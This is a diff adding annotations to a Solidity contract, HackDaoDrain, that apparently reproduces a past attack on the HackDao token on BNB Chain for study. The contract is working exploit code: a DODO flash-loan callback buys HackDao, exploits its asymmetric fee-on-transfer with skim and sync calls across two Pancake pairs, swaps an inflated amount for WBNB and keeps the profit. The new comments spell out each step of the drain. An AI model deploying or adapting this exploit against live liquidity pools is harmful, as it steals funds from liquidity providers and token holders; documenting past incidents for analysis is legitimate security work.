@@ -13,6 +13,12 @@ pragma solidity ^0.8.10;
 // anywhere), compiled inside the registry forge project. Logic and constants
 // are copied verbatim from test/HackDao_exp.sol.
 //
+// VULNERABILITY: Asymmetric fee-on-transfer in HackDao._transfer keyed to one
+// hard-wired `uniswapV2Pair` (the USDT LP) + anyone-can-call skim/sync on
+// fee-unaware PancakePair. See sources/Token_94e06c/Token.sol for the exact
+// _transfer branches (extra debit + full credit only on transfers *to* the
+// special pair) and sources/PancakePair_cd4CDA/PancakePair.sol for skim/sync.
+//
 // Root cause: the Hackerdao (HackDao) token is a heavy fee-on-transfer /
 // reflection token listed in a vanilla (fee-unaware) Pancake pair. Its
 // overridden `_transfer` debits an EXTRA 12% fee from the sender on a "sell"
@@ -77,19 +83,38 @@ contract HackDaoDrain {
 
     // DODO flash-loan callback — verbatim from ContractTest.DPPFlashLoanCall()
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
-        // get HackDao
+        // EXPLOIT STEP 1: Borrowed WBNB -> buy HackDao on Pair1 (WBNB/HackDao). Fee-on-transfer on HackDao OUT from LP
+        // makes actual balance received lower; sets up initial divergence.
         buyHackDao();
-        // call skim() to burn HackDao in lp
+
+        // EXPLOIT STEP 2: transfer bought HackDao into Pair1.
+        // Because recipient != the token's special `uniswapV2Pair` (Pair2), normal fee applies:
+        // Pair1 receives only ~88%, creating actual_bal > reserve0.
         HackDao.transfer(address(Pair1), HackDao.balanceOf(address(this)));
+
+        // EXPLOIT STEP 3: Pair1.skim(Pair2) — excess goes to the *special* USDT pair.
+        // Transfer *to* uniswapV2Pair triggers the "sell" branch in HackDao._transfer:
+        // sender (Pair1) debited amount+extra_fee, recipient (Pair2) credited full amount.
+        // => Pair1 actual now < its cached reserve0.
         Pair1.skim(address(Pair2));
+
+        // EXPLOIT STEP 4: Pair1.sync() collapses reserve0 down to the now-depleted actual balance.
         Pair1.sync();
+
+        // EXPLOIT STEP 5: Pair2.skim(Pair1) moves the skimmed HackDao back (taxed again on this leg).
+        // Actual balance in Pair1 is now high while reserve0 is low.
         Pair2.skim(address(Pair1));
-        // sell HackDao
+
+        // EXPLOIT STEP 6: Compute fake-huge amountin = (current actual balance - low reserve0) and
+        // sell it for WBNB using the untouched reserve1 in the constant-product formula.
+        // The tokens are already in the pair; swap happily pays out the inflated amountout.
         (uint256 reserve0, uint256 reserve1,) = Pair1.getReserves(); // HackDao WBNB
         uint256 amountAfter = HackDao.balanceOf(address(Pair1));
         uint256 amountin = amountAfter - reserve0;
         uint256 amountout = amountin * 9975 * reserve1 / (reserve0 * 10_000 + amountin * 9975);
         Pair1.swap(0, amountout, address(this), "");
+
+        // EXPLOIT STEP 7: repay flash loan; profit (excess WBNB extracted from Pair1) stays here.
         WBNB.transfer(dodo, 1900 * 1e18);
     }
 
